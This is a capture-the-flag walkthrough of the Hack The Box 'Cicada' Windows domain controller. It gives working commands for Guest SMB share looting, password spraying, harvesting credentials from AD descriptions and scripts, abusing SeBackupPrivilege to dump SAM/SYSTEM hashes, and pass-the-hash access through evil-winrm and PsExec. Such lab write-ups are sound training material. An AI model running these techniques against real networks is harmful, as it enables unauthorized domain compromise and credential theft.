# Cicada — Hack The Box

Windows Server 2022 domain controller. The path in this session was Guest SMB access → a default password in HR → domain user enumeration → another password in an AD user description → DEV share → an exposed WinRM credential → Backup Operators → offline registry hive analysis → Administrator authentication.

The target address for this session was `10.129.231.149`; HTB assigns a new address when an instance is restarted. Commands below omit flag values and plaintext passwords. Enter the passwords found during enumeration when prompted.

## Reconnaissance

As root on Kali:

```bash
export TARGET=10.129.231.149
echo "$TARGET cicada.htb cicada-dc.cicada.htb" >> /etc/hosts
nmap -sV -oN cicada-initial.nmap "$TARGET"
nmap -Pn -p 139,445 --script smb-protocols,smb2-capabilities,smb2-security-mode,smb2-time -oN cicada-smb.nmap "$TARGET"
```

DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), and WinRM (5985) pointed to an Active Directory domain controller. The hostname was `CICADA-DC.cicada.htb`. SMB 2/3 was supported and signing was required.

The anonymous LDAP RootDSE query identified the directory base:

```bash
ldapsearch -LLL -x -H "ldap://$TARGET" -b '' -s base defaultNamingContext namingContexts dnsHostName supportedLDAPVersion
```

`defaultNamingContext` was `DC=cicada,DC=htb`. RootDSE access alone did not establish anonymous access to domain objects.

## Guest access and the HR share

An empty-username SMB session listed no shares. The SMB1 workgroup error from `smbclient` was a separate fallback and did not negate SMB 2/3 connectivity:

```bash
smbclient -L "//$TARGET" -U '' -N
```

Explicitly authenticating as Guest with an empty password revealed `HR` and `IPC$` with READ permission:

```bash
nxc smb "$TARGET" -u 'guest' -p '' --shares
mkdir -p HR
cd HR
smbclient "//$TARGET/HR" -U 'guest%' -c 'recurse ON; prompt OFF; mget *'
rg --files
rg -n -i 'password|credential|username|login' .
```

`Notice from HR.txt` disclosed a default password but no username. `IPC$` is an RPC transport share, not a folder of ordinary documents.

## Domain accounts and a valid login

Guest could request SID mappings over the RPC pipe:

```bash
impacket-lookupsid "cicada.htb/guest@$TARGET" -no-pass
```

The `SidTypeUser` results included five human users: `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious`, and `emily.oscars`. Built-in accounts and the computer account were excluded from the password test. Impacket's “Brute forcing SIDs” message describes RID/SID lookup, not password guessing.

From the `HR` directory, make a one-user-per-line list and test the single discovered password through LDAP:

```bash
printf '%s\n' john.smoulder sarah.dantelia michael.wrightson david.orelious emily.oscars > ../users.txt
read -rsp 'Password from the HR notice: ' HR_PASS
nxc ldap "$TARGET" -u ../users.txt -p "$HR_PASS" --continue-on-success
```

`michael.wrightson` authenticated. A WinRM check for Michael failed: valid domain credentials did not imply permission to open a remote shell.

```bash
nxc winrm "$TARGET" -u michael.wrightson -p "$HR_PASS"
nxc smb "$TARGET" -u michael.wrightson -p "$HR_PASS" --users
```

Authenticated user enumeration exposed a password in `david.orelious`'s **Active Directory description**. It appeared in SMB/RPC output, but was not stored in a file on an SMB share.

## DEV share and WinRM foothold

With the password from David's description, the DEV share became readable:

```bash
read -rsp 'Password from David’s user description: ' DAVID_PASS
nxc smb "$TARGET" -u david.orelious -p "$DAVID_PASS" --shares
mkdir -p ../DEV
cd ../DEV
smbclient "//$TARGET/DEV" -U "david.orelious%$DAVID_PASS" -c 'get Backup_script.ps1'
cat Backup_script.ps1
```

The script referenced `emily.oscars` and constructed a `PSCredential` from a plaintext password. It did **not** reset Emily's password; the credential object was not passed to `Compress-Archive`. The password was nevertheless valid, and Emily had WinRM access:

```bash
read -rsp 'Password from Backup_script.ps1: ' EMILY_PASS
nxc winrm "$TARGET" -u emily.oscars -p "$EMILY_PASS"
evil-winrm -i "$TARGET" -u emily.oscars -p "$EMILY_PASS"
```

In Emily's Evil-WinRM PowerShell session:

```powershell
whoami /all
```

She belonged to `BUILTIN\Backup Operators` and `BUILTIN\Remote Management Users`. Her token had `SeBackupPrivilege` and `SeRestorePrivilege` enabled. The first privilege provided the useful route to protected registry data; Backup Operators membership, not the backup script, granted these rights.

## Registry hives and Administrator access

Save copies of the SAM and SYSTEM hives in Emily's current Documents directory. SAM contains account hashes; SYSTEM supplies the boot key needed to interpret them.

```powershell
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
```

Enter each Evil-WinRM `download` command **alone at the prompt**. It is a client command, not a PowerShell cmdlet:

```text
download sam.hiv
download system.hiv
```

In this session the second transfer failed with `WinRM::FS::FileManager::EstandardError`. Compression worked around it. Run the PowerShell command first, then enter `download` separately:

```powershell
Compress-Archive -Path .\system.hiv -DestinationPath .\system.zip -Force
```

```text
download system.zip
```

Back in the Kali directory where Evil-WinRM was launched:

```bash
unzip -t system.zip
unzip -o system.zip
impacket-secretsdump -sam sam.hiv -system system.hiv local
```

The offline dump yielded an NT hash for `Administrator` (RID 500). The `aad3…` value in the preceding LM field was not the NT hash. Use the Administrator NT hash without storing it in this writeup:

```bash
read -rsp 'Administrator NT hash from secretsdump: ' ADMIN_NT
evil-winrm -i "$TARGET" -u Administrator -H "$ADMIN_NT"
```

`whoami /all` in that session showed `CICADA\Administrator`, RID 500, in Domain Admins, Enterprise Admins, Schema Admins, and the local Administrators group. For an additional SYSTEM-session check, PsExec used the same hash to start a temporary service over the writable `ADMIN$` share:

```bash
impacket-psexec -hashes ":$ADMIN_NT" "cicada.htb/Administrator@$TARGET"
```

The PsExec prompt was `C:\Windows\system32>`. Confirm the identity and check both desktop locations from that CMD shell:

```cmd
whoami
type "C:\Users\emily.oscars.CICADA\Desktop\user.txt"
type "C:\Users\Administrator\Desktop\root.txt"
```

The conversation recorded the Administrator and PsExec shells, but did not include the output of these final flag commands. No flag values are included here.

## Key distinctions

- Anonymous SMB and an explicit Guest login produced different visibility.
- A readable share list did not imply read access to every share; David gained access to DEV that Guest lacked.
- An LDAP success proved Michael's password, while his WinRM check still failed.
- `nxc smb --users` retrieved an AD description through RPC; it did not discover an SMB document.
- The script exposed Emily's credential but did not grant her backup privileges.
- Emily copied protected hives; offline extraction recovered the Administrator hash. Her account did not become Administrator.
- `CICADA\Administrator` on the domain controller was already domain administrative access. `NT AUTHORITY\SYSTEM` is a separate local service identity.
